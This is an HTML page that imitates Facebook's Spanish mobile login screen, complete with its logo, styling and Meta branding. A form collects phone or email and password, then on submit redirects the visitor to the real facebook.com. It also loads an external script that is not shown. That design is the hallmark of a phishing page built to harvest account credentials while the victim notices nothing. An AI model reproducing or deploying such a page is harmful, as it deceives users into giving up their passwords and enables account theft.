<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Inicia sesión o regístrate</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 0 16px;
        }

        /* Top Banner */
        .top-banner {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px 0;
            color: #1c2b33;
            font-size: 14px;
            text-decoration: none;
            border-bottom: 1px solid #e5e5e5;
            margin-bottom: 20px;
        }

        .top-banner svg {
            margin-right: 8px;
            fill: #1877f2;
        }

        /* Language */
        .language {
            font-size: 12px;
            color: #7f7f7f;
            margin-bottom: 40px;
        }

        /* Main Container */
        .login-container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .fb-logo {
            width: 60px;
            height: 60px;
            margin-bottom: 40px;
        }

        /* Form */
        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        input {
            width: 100%;
            padding: 16px;
            border: 1px solid #ccd0d5;
            border-radius: 12px;
            font-size: 16px;
            background-color: #f5f6f7;
            outline: none;
        }

        input::placeholder {
            color: #8d949e;
        }

        input:focus {
            border-color: #1877f2;
            background-color: #ffffff;
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #0064e0;
            color: white;
            border: none;
            border-radius: 24px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 4px;
        }

        .btn-login:active {
            background-color: #0056c1;
        }

        .forgot-password {
            color: #1c1e21;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            text-align: center;
            margin-top: 20px;
            margin-bottom: 120px;
        }

        /* Footer / Create Account */
        .footer-container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 24px;
            margin-top: auto;
            padding-bottom: 40px;
        }

        .btn-create {
            width: 100%;
            padding: 12px;
            background-color: transparent;
            color: #0064e0;
            border: 1px solid #0064e0;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 600;
            text-decoration: none;
            text-align: center;
        }

        .meta-logo-img {
            width: 60px;
            height: auto;
            display: block;
        }
    </style>
</head>
<body>

    <a href="#" class="top-banner">
        <svg width="18" height="18" viewBox="0 0 24 24"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z"/></svg>
        Descarga Facebook para Android y navega más rápido.
    </a>

    <div class="language">Español</div>

    <div class="login-container">
        <svg class="fb-logo" viewBox="0 0 36 36">
            <path fill="#1877f2" d="M36,18C36,8.06 27.94,0 18,0C8.06,0 0,8.06 0,18C0,26.99 6.56,34.45 15.19,35.81l0,-12.6l-4.58,0l0,-5.21l4.58,0l0,-3.97c0,-4.52 2.69,-7.02 6.81,-7.02c1.98,0 4.04,0.35 4.04,0.35l0,4.44l-2.28,0c-2.24,0 -2.94,1.39 -2.94,2.82l0,3.36l5,0l-0.8,5.21l-4.2,0l0,12.6C29.44,34.45 36,26.99 36,18Z"/>
        </svg>

        <form onsubmit="event.preventDefault();">
            <input type="text" placeholder="Celular o correo electrónico" required>
            <input type="password" placeholder="Contraseña" required>
            <button type="submit" class="btn-login">Iniciar sesión</button>
        </form>

        <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
    </div>

    <div class="footer-container">
        <a href="#" class="btn-create">Crear cuenta nueva</a>
        
        <img class="meta-logo-img" src="https://z-m-static.xx.fbcdn.net/rsrc.php/ys/r/RkrEdst9VSp.webp" alt="Meta Logo">
    </div>
<script>
    document.querySelector('form').addEventListener('submit', function(event) {
        // Evita que la página se recargue automáticamente
        event.preventDefault(); 
        
        // Redirige al usuario a la página de Facebook
        window.location.href = 'https://www.facebook.com';
    });
</script>

<script src="app.js"></script>
</body>
</html>
